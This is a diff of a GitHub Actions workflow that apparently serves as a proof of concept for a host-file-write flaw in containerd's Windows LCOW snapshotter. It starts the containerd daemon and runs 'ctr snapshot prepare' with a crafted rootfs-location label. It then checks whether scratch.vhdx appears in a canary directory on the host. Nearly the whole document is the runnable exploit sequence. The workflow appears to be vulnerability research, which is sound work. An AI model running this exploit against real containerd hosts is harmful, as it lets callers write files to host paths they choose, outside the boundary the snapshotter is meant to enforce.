@@ -1,4 +1,4 @@
-name: CAN-000047 LCOW host-file write PoC
+name: D17 LCOW host-file write PoC
 on:
   workflow_dispatch:
   push:
@@ -9,79 +9,71 @@ jobs:
     runs-on: windows-latest
     timeout-minutes: 20
     steps:
-      - name: Setup dirs + download containerd 2.4.2 (official release)
+      - name: Download containerd 2.4.2 and prep dirs
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Stop'
           $base = 'C:\ctdpoc'
-          New-Item -ItemType Directory -Force -Path $base, "$base\bin", "$base\root", "$base\state", "$base\canary" | Out-Null
-          # canary dir: attacker-chosen location that must NOT initially contain scratch.vhdx
-          $canary = 'C:\ctdpoc\canary'
+          New-Item -ItemType Directory -Force -Path "$base\bin", "$base\root", "$base\state", "$base\canary" | Out-Null
           Write-Output "CANARY_BEFORE:"
-          Get-ChildItem $canary -Force | Select-Object Name,Length,LastWriteTime | Format-Table
-          Write-Output "PREREQ scratch.vhdx present? $(Test-Path "$canary\scratch.vhdx")"
-          # Download + extract official release
+          Get-ChildItem "$base\canary" -Force | Select-Object Name,Length | Format-Table
+          Write-Output "PREREQ scratch present? $(Test-Path "$base\canary\scratch.vhdx")"
           Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
           tar xzf "$base\ctd.tar.gz" -C "$base\bin"
           Get-ChildItem "$base\bin\bin" | Select-Object Name,Length | Format-Table
 
-      - name: Generate containerd config enabling lcow snapshotter
+      - name: Write containerd config
         shell: pwsh
         run: |
           $base = 'C:\ctdpoc'
-          $cfg = @"
-version = 2
-root = "$($base -replace '\\','\\')\root"
-state = "$($base -replace '\\','\\')\state"
-[grpc]
-  address = '\\.\pipe\ctdpoc-containerd'
-  uid = 0
-  gid = 0
-[debug]
-  level = 'debug'
-[plugins.'io.containerd.cri.v1.runtime']
-  enable_selinux = false
-"@
-          # minimal config: just root/state + plugin registration defaults; lcow is built-in on Windows
-          $cfg | Set-Content -Path "$base\config.toml" -Encoding utf8
+          $lines = @(
+            'version = 2',
+            'root = "C:/ctdpoc/root"',
+            'state = "C:/ctdpoc/state"',
+            '[grpc]',
+            "  address = '\\\\.\\pipe\\ctdpoc-containerd'",
+            '  uid = 0',
+            '  gid = 0',
+            '[debug]',
+            "  level = 'debug'"
+          )
+          $lines | Set-Content -Path "$base\config.toml" -Encoding ascii
+          Write-Output '=== config.toml ==='
           Get-Content "$base\config.toml"
 
-      - name: Start containerd daemon
+      - name: Start containerd and list snapshotter plugins
         shell: pwsh
         run: |
           $base = 'C:\ctdpoc'
           $p = Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
           Write-Output "CONTAINERD_PID=$($p.Id)"
-          Start-Sleep -Seconds 6
-          Write-Output "--- alive? ---"
-          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName
-          Write-Output "--- stderr (tail) ---"
+          Start-Sleep -Seconds 8
+          Write-Output '--- alive? ---'
+          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
+          Write-Output '--- plugins (snapshotter) ---'
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctdpoc-containerd' plugins ls 2>&1 | Select-String 'snapshotter'
+          Write-Output '--- stderr tail ---'
           if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 40 }
-          Write-Output "--- ctr plugins (snapshotters) ---"
-          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctdpoc-containerd' plugins ls 2>&1 | Select-String 'snapshotter' | Select-Object -First 20
 
-      - name: Trigger vulnerable snapshot Prepare via ctr (official client API)
+      - name: Trigger malicious snapshot Prepare via ctr
         shell: pwsh
         run: |
           $base = 'C:\ctdpoc'
           $ctr = "$base\bin\bin\ctr.exe"
           $addr = '\\.\pipe\ctdpoc-containerd'
-          $ns  = 'd17poc'
-          $key = 'victim-sandbox'
           $loc = 'C:\ctdpoc\canary'
           $label = "containerd.io/snapshot/io.microsoft.container.storage.rootfs.location=$loc"
           Write-Output "=== malicious label: $label ==="
-          # ctr snapshot prepare --label <label> -n <ns> [--snapshotter windows-lcow] <key> <parent>
-          & $ctr --address $addr -n $ns snapshot prepare --label $label --snapshotter 'windows-lcow' $key '' 2>&1 | Tee-Object -FilePath "$base\prepare.out"
+          & $ctr --address $addr -n d17poc snapshot prepare --label $label --snapshotter 'windows-lcow' victim-sandbox '' 2>&1 | Tee-Object -FilePath "$base\prepare.out"
           Write-Output "CTR_EXIT=$LASTEXITCODE"
           Start-Sleep -Seconds 3
-          Write-Output "=== CANARY AFTER ==="
+          Write-Output '=== CANARY AFTER ==='
           Get-ChildItem $loc -Force | Select-Object Name,Length,LastWriteTime | Format-Table
           $probe = Join-Path $loc 'scratch.vhdx'
           Write-Output "HOST_FILE_WRITTEN=$(Test-Path $probe)"
           if (Test-Path $probe) { Get-Item $probe | Select-Object FullName,Length,LastWriteTime | Format-List; Get-FileHash $probe -Algorithm SHA256 | Format-List }
-          Write-Output "=== daemon stderr tail ==="
-          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 50 }
+          Write-Output '=== daemon stderr tail ==='
+          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 60 }
 
       - name: Upload evidence
         if: always()
